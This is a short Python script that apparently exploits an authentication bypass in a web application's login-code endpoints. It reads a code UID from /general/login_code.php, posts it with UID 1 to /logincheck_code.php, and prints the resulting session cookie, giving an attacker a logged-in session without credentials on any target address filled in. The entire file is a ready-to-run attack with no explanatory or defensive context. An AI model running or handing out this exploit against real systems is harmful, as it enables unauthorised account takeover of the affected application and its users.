import requests

url = 'http://YOUR IP/DOMAIN ADDR'
checkurl = url+'/general/login_code.php'
res = requests.get(checkurl)
restext = str(res.text).split('{')
codeuid = restext[-1].replace('}"}', '').replace('\r\n', '')
getessurl = url+'/logincheck_code.php'
res = requests.post(
    getessurl, data={'CODEUID': '{'+codeuid+'}', 'UID': int(1)})
print('[+]Get Available COOKIE '+res.headers['Set-Cookie'])
